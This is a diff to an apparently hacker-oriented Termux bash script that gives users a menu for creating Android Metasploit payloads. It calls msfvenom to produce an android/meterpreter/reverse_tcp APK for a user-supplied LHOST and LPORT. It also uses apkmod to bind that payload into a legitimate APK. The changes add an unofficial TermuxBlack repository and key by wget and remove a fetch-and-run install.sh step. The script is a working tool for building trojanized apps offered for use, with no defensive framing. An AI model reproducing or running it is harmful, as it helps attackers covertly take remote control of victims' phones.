@@ -1,7 +1,13 @@
-#! /data/data/com.termux/files/usr/bin/bash
+#!/data/data/com.termux/files/usr/bin/bash
+
+exit_on_signal_SIGINT () {
+    echo -e "\n\n\e${RED}[✗] Received INTR call - Exiting...\e[0m"
+    exit 0
+}
+trap exit_on_signal_SIGINT SIGINT
 
 
-#loading
+# LoadingBar
 progreSh() {
     LR='\033[1;31m'
     LG='\033[1;32m'
@@ -65,16 +71,39 @@ clear
 
 
 
-#requirement
-echo -e "\e[36m NOW REQUIREMENTS WILL BE INSTALLED"
-sleep 2
-pkg install lolcat
-pkg install ncurses ncurses-utils
- 
-
+# requirements
+if ! hash python &>/dev/null;then
+    echo -e $BOLD Installing python....
+    pkg i python
+else
+    echo -e $BOLD python Installed!
+fi
+if ! pip show lolcat &>/dev/null;then
+    echo -e $BOLD Installing lolcat....
+    pip3 install lolcat
+else
+    echo -e $BOLD lolcat Installed!
+fi
+if ! hash ncurses &>/dev/null;then
+    echo -e $BOLD Installing python....
+    pkg i ncurses ncurses-utils
+else
+    echo -e $BOLD ncurses Installed!
+fi
+if ! hash apkmod &>/dev/null;then
+    echo -e $BOLD Installing python....
+    mkdir -p $PREFIX/etc/apt/sources.list.d && printf "deb https://hax4us.github.io/TermuxBlack/ termuxblack main" > $PREFIX/etc/apt/sources.list.d/termuxblack.list
+    wget -q https://hax4us.github.io/TermuxBlack/termuxblack.key -O termuxblack.key && apt-key add termuxblack.key && rm termuxblack.key
+    apt-get update -yq --silent
+    pkg i apkmod
+else
+    echo -e $BOLD apkmod Installed!
+fi
 
 #colors
+BOLD="$(printf '\033[1m')"
 BLUE="$(printf '\033[34m')"
+RED="$(printf '\033[31m')"
 MAGENTA="$(printf '\033[35m')"
 CYAN="$(printf '\033[36m')"
 WHITE="$(printf '\033[37m')"
@@ -88,85 +117,75 @@ CYANBG="$(printf '\033[46m')"
 WHITEBG="$(printf '\033[47m')"
 BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
+while true ;do
 clear
-echo -e $MAGENTA       "==========================[+]==================================="
-echo -e $CYAN             " ____             _ _ _                    _ "
-echo -e $CYAN             "|  _ \  _____   _(_) | |    ___   __ _  __| |"
-echo -e $CYAN             "| | | |/ _ \ \ / / | | |   / _ \ /    |/    |"
-echo -e $CYAN             "| |_| |  __/\ V /| | | |__| (_) | (_| | (_| |"
-echo -e $CYAN             "|____/ \___| \_/ |_|_|_____\___/ \__,_|\__,_|"
-echo -e $CYAN             "                                             "
-echo -e                   "                VERSION : 3.0                 "
-echo                    "=========================[+]==================================="
-echo
-echo -e $CYAN          "............>>> CODED BY : D4RKD3V7L <<<.............."
-echo -e $CYAN          "............>>> MODIFIED BY : GUARDIAN <<<.............."
-echo 
+sleep 0.02
+echo -e $MAGENTA"=========================[+]==================================="
+echo -e "\033[36;1m
+                   ┌─────────────────────────┐
+                   │╺┳┓┏━╸╻ ╻╻╻  ╻  ┏━┓┏━┓╺┳┓│
+                   │ ┃┃┣╸ ┃┏┛┃┃  ┃  ┃ ┃┣━┫ ┃┃│
+                   │╺┻┛┗━╸┗┛ ╹┗━╸┗━╸┗━┛╹ ╹╺┻┛│
+                   └─────────────────────────┘
+\033[0m"
 
-
-
+echo -e                   "                        VERSION : 3.0-beta           "
+echo -e $MAGENTA"=========================[+]==================================="
 echo
-echo
-echo
-echo
-echo
-echo
-echo
-echo
-echo -e "AVAILABLE \e[36mOPTIONS"
+echo -e $CYAN          "............>>> CODED BY    : D4RKD3V7L <<<.............."
+echo -e $CYAN          "............>>> MODIFIED BY : GUARDIAN  <<<.............."
+echo -e $CYAN          "............>>> ENHANCED BY : kNIGHT    <<<.............."
+echo -e $BOLD ""
+echo -e "AVAILABLE \033[36mOPTIONS: \033[0m"
 echo ""
 
 
-echo -e "[1]MAKE \e[105m MSF PAYLOAD"
-echo ""
-echo -e "\e[0m"
-echo ""
-echo -e "[2]BIND PAYLOAD \e[105m WITH APKMOD"
-echo ""
+echo -e $BOLD "[1] MAKE MSF PAYLOAD \033[0m"
+echo -e $BOLD ""
+echo -e $BOLD "[2] BIND PAYLOAD WITH APKMOD \033[0m"
+echo -e $BOLD ""
+echo -e $BOLD "[3] EXIT \033[0m"
 echo -e "\e[0m"
 
 read -p $'\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m \e[1;36m Choose An Option: \e[0m' ch
 
 
-if [[ $ch -eq '1' || $ch -eq '01' ]];then
-
-echo -e "\e[1;96m"
-
-echo -e [*] "Enter your local IP for LHOST: "
-read lh
-echo
-echo
-echo -e [*] "Enter your port numer for LPORT: "
-read lport
-echo
-echo
-echo -e [*] "Enter your apk file name here [with extension!!!!!]: "
-read apk
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lport R>$apk
-echo
-echo
-echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER"
-sleep 5
-echo -e  "______________________________________THANKS FOR USING MY TOOL_________________"
-
-
-
-elif [[ $ch -eq '2' || $ch -eq '02' ]];then
-
-clear
-
-echo -e "\e[1;94m"
-
-echo -e "\e[1;4mNOW APK MOD WILL BE INSTALLED PLEASE DONT CANCEL THE OPERATION"
-sleep 2
-wget https://github.com/Hax4us/TermuxBlack/raw/master/install.sh
-bash install.sh
-clear
-pkg install apkmod
-sleep 1
-clear
-echo -e "TO RUN APKMOD \e[46mJUST TYPE apkmod ON YOUR TERMINAL"
-echo ""
-echo -e "\e[0m"
-echo -e $BLACK "______________________________________THANKS FOR USING MY TOOL_________________"
-fi
+case $ch in
+    1|01)
+	echo -e "\e[1;96m"    
+	echo -ne $BOLD [*] "Enter your local IP for LHOST: "
+	read lhost
+	echo -ne $BOLD [*] "Enter your port number for LPORT: "
+	read lport
+	echo -ne $BOLD [*] "Enter your apk file name here [with extension!!!!!]: "
+	read apk
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$apk || echo -e $RED Invalid Apk!!!!
+	echo -e $BOLD ""
+	echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER \e[0m"
+	sleep 5
+	;;
+    
+    2|02)
+	echo -e "\e[1;94m"
+	echo -e "\e[1;96m"    
+	echo -ne $BOLD [*] "Enter your local IP for LHOST: "
+	read lhost
+	echo -ne $BOLD [*] "Enter your port number for LPORT: "
+	read lport
+	echo -ne $BOLD [*] "Enter path to apk you want to bind: "
+	read path
+	apkmod -b $path -o /sdcard/bindedmsf.apk LHOST=$lhost LPORT=$lport || apkmod -u
+	echo -e $BOLD ""
+	echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER \033[0m"
+	sleep 5
+	;;
+    3)
+	echo -e $BOLD "Exiting....!"
+	exit 0
+	;;
+    *)
+	echo -e "\033[31;1m[!] Invalid Input! Exiting... \033[0m"
+	exit 0
+	;;
+esac
+done
